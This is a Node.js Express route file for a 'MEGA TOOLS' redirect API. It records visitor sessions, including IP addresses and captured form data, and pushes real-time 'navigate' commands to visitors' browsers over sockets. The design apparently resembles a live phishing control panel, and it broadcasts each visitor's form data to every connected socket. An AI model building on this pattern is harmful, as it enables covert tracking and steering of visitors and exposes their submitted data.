// ============================================================
// MEGA TOOLS — REDIRECT ROUTES (DEDICATED ACTION API)
// FIX: getVisitorSockets → getSessionSockets
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Link = require('../models/Link');
const Session = require('../models/Session');
const { getSessionSockets } = require('../services/sessionManager');

function buildSessionDelta(session, type) {
  return {
    type, timestamp: new Date().toISOString(),
    session: {
      _id: session._id, visitorId: session.visitorId, trackingCode: session.trackingCode,
      isLive: session.isLive, status: session.status || 'Online', lastActivity: session.lastActivity,
      clicks: session.clicks, submissions: session.submissions, deviceType: session.deviceType,
      baseCode: session.baseCode, entryUrl: session.entryUrl, currentUrl: session.currentUrl,
      ip: session.ip, browser: session.browser, formData: session.formData,
      redirectHistory: session.redirectHistory || [],
      lastCommand: session.lastCommand, lastCommandUrl: session.lastCommandUrl, commandSeq: session.commandSeq,
    },
  };
}

// ============================================================
// POST /api/redirect
// Body: { trackingCode, redirectCode, visitorId, ip }
// ============================================================
router.post('/', async (req, res) => {
  try {
    const { trackingCode, redirectCode, visitorId, ip } = req.body;

    if (!trackingCode || !redirectCode) {
      return res.status(400).json({ success: false, message: 'trackingCode and redirectCode are required' });
    }

    // 1. Find link by redirectCode
    const allLinks = await db.links.read();
    const link = allLinks.find(l => l.redirectCode === redirectCode || l.baseCode === redirectCode);

    if (!link) {
      return res.status(404).json({ success: false, message: 'Link not found for this redirect code' });
    }

    // 2. Build target URL with visitorId
    const base = (link.baseUrl || 'http://localhost:5174').replace(/\/$/, '');
    const clientIp = ip || req.ip || '';
    const effectiveVisitorId = visitorId || clientIp || null;
    const vid = visitorId || '';
    const targetUrl = `${base}/${trackingCode}_${link.redirectCode || link.baseCode}${vid ? '?vid=' + vid : ''}`;

    // 3. Update session using Session.upsert (UPDATE ONLY)
    let sessionTrackingCode = trackingCode;
    try {
      const { session, isNew } = await Session.upsert({
        visitorId: effectiveVisitorId,
        trackingCode,
        baseCode: link.redirectCode || link.baseCode || '',
        linkId: link._id ? link._id.toString() : null,
        ip: clientIp,
        browser: 'Unknown',
        deviceType: 'Desktop',
        entryUrl: link.redirectCode || link.baseCode || '',
        currentUrl: targetUrl,
        collectedTypes: ['redirect_click'],
      });

      sessionTrackingCode = session.trackingCode || trackingCode;

      const io = req.app.get('io');
      if (io) {
        io.emit('sessionDelta', buildSessionDelta(session, isNew ? 'new' : 'updated'));
      }
    } catch (err) {
      console.error('[Redirect] Session update error:', err.message);
    }

    // 4. Emit socket events for real-time redirect
    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = {
      action: 'navigate',
      url: targetUrl,
      message: '',
      seq: Date.now(),
      visitorId: visitorId || '',
      trackingCode: sessionTrackingCode,
      timestamp: new Date().toISOString(),
    };

    if (io) {
      // Direct socket emit by visitorId
      if (sockets && visitorId) {
        const socketId = sockets[visitorId];
        if (socketId) {
          io.to(socketId).emit('session_command', command);
        }
      }
      // Room-based fallback
      if (sessionTrackingCode) {
        io.to('room_' + sessionTrackingCode).emit('session_command', command);
      }
    }

    // 5. Update link click count
    try {
      if (link._id) {
        const linkIndex = allLinks.findIndex(l =>
          (l._id?.toString?.() || l._id) === (link._id?.toString?.() || link._id)
        );
        if (linkIndex !== -1) {
          allLinks[linkIndex].total_clicks = (allLinks[linkIndex].total_clicks || 0) + 1;
          allLinks[linkIndex].last_click = new Date().toISOString();
          await db.links.write(allLinks);
        }
      }
    } catch (err) {
      console.error('[Redirect] Link update error:', err.message);
    }

    res.json({
      success: true,
      redirectUrl: targetUrl,
      linkName: link.name,
      message: 'Redirect URL generated',
    });
  } catch (err) {
    console.error('[Redirect] Error:', err.message);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// EXPORT
// ============================================================

module.exports = router;